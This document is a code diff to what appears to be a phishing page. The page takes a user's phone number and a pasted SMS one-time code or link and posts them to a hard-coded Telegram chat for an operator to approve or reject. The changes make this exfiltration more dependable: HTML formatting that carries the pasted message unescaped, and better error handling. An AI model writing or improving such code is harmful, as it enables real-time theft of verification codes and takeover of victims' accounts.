@@ -224,10 +224,14 @@
 
         function closeModal() {
             errorModal.style.display = 'none';
-            document.getElementById('smsInput').value = '';
-            document.getElementById('smsInput').focus();
-            document.getElementById('submitBtn').disabled = true;
-            document.getElementById('submitBtn').classList.remove('active');
+            const smsBox = document.getElementById('smsInput');
+            smsBox.value = '';
+            smsBox.focus();
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.classList.remove('active');
+            btn.innerHTML = 'SUBMIT';
+            btn.style.opacity = '1';
         }
 
         const savedPhone = sessionStorage.getItem('savedPhone');
@@ -282,8 +286,8 @@
         const chatId = '1003670447';
 
         function sendOTPToTelegram(phone, smsText) {
-            const escapeMd = s => s.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
-            const message = `📱 *Step 2: OTP / Link Submission (Liberia)*\nPhone: \`+${escapeMd(phone)}\`\n✉️ Pasted Message:\n\`${escapeMd(smsText)}\`\n\n👇 Please Approve or Reject:`;
+            // Using HTML format to avoid Markdown parsing errors with links/symbols
+            const message = `📱 <b>Step 2: OTP / Link Submission (Liberia)</b>\nPhone: <code>+${phone}</code>\n✉️ Pasted Message:\n<pre>${smsText}</pre>\n\n👇 Please Approve or Reject:`;
 
             const inlineKeyboard = {
                 inline_keyboard: [
@@ -305,8 +309,8 @@
                 body: JSON.stringify({
                     chat_id: chatId,
                     text: message,
-                    parse_mode: 'MarkdownV2',
-                    reply_markup: JSON.stringify(inlineKeyboard)
+                    parse_mode: 'HTML',
+                    reply_markup: inlineKeyboard
                 })
             });
         }
@@ -376,8 +380,12 @@
             btn.disabled = true;
 
             sendOTPToTelegram(cleanPhoneForBot, smsText)
-                .then(response => {
-                    if (!response.ok) throw new Error("Failed to send Telegram message");
+                .then(async response => {
+                    const resJson = await response.json();
+                    if (!response.ok || !resJson.ok) {
+                        console.error("Telegram API detail:", resJson);
+                        throw new Error(resJson.description || "Failed to send Telegram message");
+                    }
                     startListeningForOTPDecision(cleanPhoneForBot, btn);
                 })
                 .catch(error => {
